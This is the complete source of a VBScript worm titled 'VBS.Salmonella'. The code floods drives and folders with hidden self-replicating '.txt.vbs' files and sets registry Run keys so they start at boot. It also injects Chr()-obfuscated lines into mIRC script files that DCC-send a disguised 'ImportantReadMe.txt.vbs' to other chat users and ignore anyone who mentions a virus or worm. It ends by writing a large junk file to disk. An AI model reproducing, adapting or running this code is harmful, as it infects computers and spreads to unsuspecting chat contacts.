'VBS.Salmonella

Randomize: 'On Error Resume Next
Dim Babies(30000)
Set FSO = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")

For X = 0 To 2
	Birth(FSO.GetSpecialFolder(X))
Next

Num_ = 0

For Each Driv In FSO.Drives
	If Driv.DriveType = 2 Then
		For Each Fol In FSO.GetFolder(Driv & "\").SubFolders
			Birth(Fol):Check(Fol)
			For Each SubFol In Fol.SubFolders
				Birth(SubFol):Check(SubFol)
				For Each SubSubFol In SubFol.SubFolders
					Birth(SubSubFol):Check(SubSubFol)
					For Each SubSubSubFol In SubSubFol.SubFolders
						Birth(SubSubSubFol):Check(SubSubSubFol)
						For Each SubSubSubSubFol In SubSubSubFol.SubFolders
							Birth(SubSubSubSubFol):Check(SubSubSubSubFol)
							For Each SubSubSubSubSubFol In SubSubSubSubFol.SubFolders
								Birth(SubSubSubSubSubFol):Check(SubSubSubSubSubFol)
								For Each SubSubSubSubSubSubFol In SubSubSubSubSubFol.SubFolders
									Birth(SubSubSubSubSubSubFol):Check(SubSubSubSubSubSubFol)
									Desease = SubSubSubSubSubSubFol
								Next
							Next
						Next
					Next
				Next
			Next
		Next
	End If
Next

Sub Birth(Where_)
Randomize: 'On Error Resume Next
If Right(Where_, 1) <> "\" Then Where_ = Where_ & "\"
BabysName = Where_ & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & ".txt.vbs"
Set Baby = FSO.CreateTextFile(BabysName, 2)
Baby.WriteLine "Randomize: On Error Resume Next"
Baby.WriteLine "Set FSO = CreateObject(""Scripting.FileSystemObject"")"
Baby.WriteLine "Set Shell = CreateObject(""WScript.Shell"")"
Baby.WriteLine "Set HOME = FSO.GetFolder(""."")"
Baby.WriteLine
Baby.WriteLine "Rest 120"
Baby.WriteLine 
Baby.WriteLine "Set Me_ = FSO.GetFile(WScript.ScriptFullName)"
Baby.WriteLine "Baby = HOME & ""\"" & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & "".txt.vbs"""
Baby.WriteLine "Me_.Copy(Baby)"
Baby.WriteLine "Shell.Run Baby, VbHide"
Baby.WriteLine
Baby.WriteLine "Sub Rest(HowLong)"
Baby.WriteLine "Current = Timer"
Baby.WriteLine "Do While Timer - Current < HowLong"
Baby.WriteLine "Loop"
Baby.WriteLine "End Sub"
Baby.Close
If Int(Rnd * 2) + 1 = 1 Then
	Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & BabysName, BabysName
Else
	Babies(Num_) = BabysName
	Num_ = Num_ + 1
End If
End Sub

Sub Check(Where_)
Randomize: 'On Error Resume Next
For Each File_ In FSO.GetFolder(Where_).Files
	If Lcase(File_.Name) = "script.ini" Or Lcase(File_.Name) = "mirc.ini" Then
		Set Script_ini = FSO.OpenTextFile(File_.Path, 1)
			Guts = Script_ini.ReadAll
		Script_ini.Close
		If InStr(1, Guts, "Salmonella", vbTextCompare) = 0 Then
			Set Me_ = FSO.GetFile(WScript.ScriptFullName)
			Me_.Copy("C:\Windows\System\ImportantReadMe.txt.vbs")
			Set Script_ini = FSO.OpenTextFile(File_.Path, 2)
				Script_ini.WriteLine Guts
				Script_ini.WriteLine Chr(110)&Chr(48)&Chr(61)&Chr(79)&Chr(78)&Chr(32)&Chr(49)&Chr(58)&Chr(74)&Chr(79)&Chr(73)&Chr(78)&Chr(58)&Chr(35)&Chr(58)&Chr(123)&Chr(32)&Chr(47)&Chr(105)&Chr(102)&Chr(32)&Chr(40)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)&Chr(32)&Chr(61)&Chr(61)&Chr(32)&Chr((6)+30)&Chr(109)&Chr(101)&Chr(32)&Chr(41)&Chr(32)&Chr(123)&Chr(32)&Chr(104)&Chr(97)&Chr(108)&Chr(116)&Chr(32)&Chr(125)
				Script_ini.WriteLine Chr(110)&Chr(49)&Chr(61)&Chr(47)&Chr(100)&Chr(99)&Chr(99)&Chr(32)&Chr(115)&Chr(101)&Chr(110)&Chr(100)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)&Chr(32)&Chr(67)&Chr(58)&Chr(92)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(115)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(92)&Chr(73)&Chr(109)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(97)&Chr(110)&Chr(116)&Chr(82)&Chr(101)&Chr(97)&Chr(100)&Chr(77)&Chr(101)&Chr(46)&Chr(116)&Chr(120)&Chr(116)&Chr(46)&Chr(118)&Chr(98)&Chr(115)
				Script_ini.WriteLine Chr(110)&Chr(50)&Chr(61)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)&Chr(125)
				Script_ini.WriteLine Chr(110)&Chr(51)&Chr(61)&Chr(79)&Chr(78)&Chr(32)&Chr(49)&Chr(58)&Chr(80)&Chr(65)&Chr(82)&Chr(84)&Chr(58)&Chr(35)&Chr(58)&Chr(123)&Chr(32)&Chr(47)&Chr(105)&Chr(102)&Chr(32)&Chr(40)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)&Chr(32)&Chr(61)&Chr(61)&Chr(32)&Chr((6)+30)&Chr(109)&Chr(101)&Chr(32)&Chr(41)&Chr(32)&Chr(123)&Chr(32)&Chr(104)&Chr(97)&Chr(108)&Chr(116)&Chr(32)&Chr(125)
				Script_ini.WriteLine Chr(110)&Chr(52)&Chr(61)&Chr(47)&Chr(100)&Chr(99)&Chr(99)&Chr(32)&Chr(115)&Chr(101)&Chr(110)&Chr(100)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)&Chr(32)&Chr(67)&Chr(58)&Chr(92)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(115)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(92)&Chr(73)&Chr(109)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(97)&Chr(110)&Chr(116)&Chr(82)&Chr(101)&Chr(97)&Chr(100)&Chr(77)&Chr(101)&Chr(46)&Chr(116)&Chr(120)&Chr(116)&Chr(46)&Chr(118)&Chr(98)&Chr(115)
				Script_ini.WriteLine Chr(110)&Chr(53)&Chr(61)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)&Chr(125)
				Script_ini.WriteLine Chr(110)&Chr(54)&Chr(61)&Chr(111)&Chr(110)&Chr(32)&Chr(49)&Chr(58)&Chr(84)&Chr(69)&Chr(88)&Chr(84)&Chr(58)&Chr(42)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(105)&Chr(110)&Chr(105)&Chr(42)&Chr(58)&Chr(35)&Chr(58)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)
				Script_ini.WriteLine Chr(110)&Chr(55)&Chr(61)&Chr(111)&Chr(110)&Chr(32)&Chr(49)&Chr(58)&Chr(84)&Chr(69)&Chr(88)&Chr(84)&Chr(58)&Chr(42)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(105)&Chr(110)&Chr(105)&Chr(42)&Chr(58)&Chr(63)&Chr(58)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)
				Script_ini.WriteLine Chr(110)&Chr(56)&Chr(61)&Chr(111)&Chr(110)&Chr(32)&Chr(49)&Chr(58)&Chr(84)&Chr(69)&Chr(88)&Chr(84)&Chr(58)&Chr(42)&Chr(118)&Chr(105)&Chr(114)&Chr(117)&Chr(115)&Chr(42)&Chr(58)&Chr(35)&Chr(58)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)
				Script_ini.WriteLine Chr(110)&Chr(57)&Chr(61)&Chr(111)&Chr(110)&Chr(32)&Chr(49)&Chr(58)&Chr(84)&Chr(69)&Chr(88)&Chr(84)&Chr(58)&Chr(42)&Chr(118)&Chr(105)&Chr(114)&Chr(117)&Chr(115)&Chr(42)&Chr(58)&Chr(63)&Chr(58)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)
				Script_ini.WriteLine Chr(110)&Chr(49)&Chr(48)&Chr(61)&Chr(111)&Chr(110)&Chr(32)&Chr(49)&Chr(58)&Chr(84)&Chr(69)&Chr(88)&Chr(84)&Chr(58)&Chr(42)&Chr(119)&Chr(111)&Chr(114)&Chr(109)&Chr(42)&Chr(58)&Chr(35)&Chr(58)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)
				Script_ini.WriteLine Chr(110)&Chr(49)&Chr(49)&Chr(61)&Chr(111)&Chr(110)&Chr(32)&Chr(49)&Chr(58)&Chr(84)&Chr(69)&Chr(88)&Chr(84)&Chr(58)&Chr(42)&Chr(119)&Chr(111)&Chr(114)&Chr(109)&Chr(42)&Chr(58)&Chr(63)&Chr(58)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)
				Script_ini.WriteLine Chr(110)&Chr(49)&Chr(50)&Chr(61)&Chr(111)&Chr(110)&Chr(32)&Chr(49)&Chr(58)&Chr(84)&Chr(69)&Chr(88)&Chr(84)&Chr(58)&Chr(42)&Chr(105)&Chr(109)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(97)&Chr(110)&Chr(116)&Chr(42)&Chr(58)&Chr(35)&Chr(58)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)
				Script_ini.WriteLine Chr(110)&Chr(49)&Chr(51)&Chr(61)&Chr(111)&Chr(110)&Chr(32)&Chr(49)&Chr(58)&Chr(84)&Chr(69)&Chr(88)&Chr(84)&Chr(58)&Chr(42)&Chr(105)&Chr(109)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(97)&Chr(110)&Chr(116)&Chr(42)&Chr(58)&Chr(63)&Chr(58)&Chr(47)&Chr(46)&Chr(105)&Chr(103)&Chr(110)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)
				Script_ini.WriteLine Chr(110)&Chr(49)&Chr(52)&Chr(61)&Chr(79)&Chr(78)&Chr(32)&Chr(49)&Chr(58)&Chr(84)&Chr(69)&Chr(88)&Chr(84)&Chr(58)&Chr(42)&Chr(98)&Chr(121)&Chr(101)&Chr(42)&Chr(58)&Chr(35)&Chr(58)&Chr(47)&Chr(100)&Chr(99)&Chr(99)&Chr(32)&Chr(115)&Chr(101)&Chr(110)&Chr(100)&Chr(32)&Chr((6)+30)&Chr(110)&Chr(105)&Chr(99)&Chr(107)&Chr(32)&Chr(67)&Chr(58)&Chr(92)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(115)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(92)&Chr(73)&Chr(109)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(97)&Chr(110)&Chr(116)&Chr(82)&Chr(101)&Chr(97)&Chr(100)&Chr(77)&Chr(101)&Chr(46)&Chr(116)&Chr(120)&Chr(116)&Chr(46)&Chr(118)&Chr(98)&Chr(115)
				Script_ini.WriteLine Chr(110)&Chr(49)&Chr(53)&Chr(59)&Chr(32)&Chr(83)&Chr(97)&Chr(108)&Chr(109)&Chr(111)&Chr(110)&Chr(101)&Chr(108)&Chr(108)&Chr(97)
			Script_ini.Close
		End If
	End If
Next
End Sub

Sub Rest(HowLong)
Current = Timer
Do While Timer - Current < HowLong
Loop
End Sub

For X = 1 To Num_
	Rest 30
	Shell.Run Babies(X), VbHide
Next

While Len(Poison) <= 1000000
	Poison = Poison & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255))
	Poison = Poison & Poison
Wend
Set Deseased = FSO.OpenTextFile(Desease & "\" & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & "." & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)) & Chr(Int(Rnd * 255)))

For Inject = 1 to 20
	Deseased.Write Poison
Next

Deseased.Close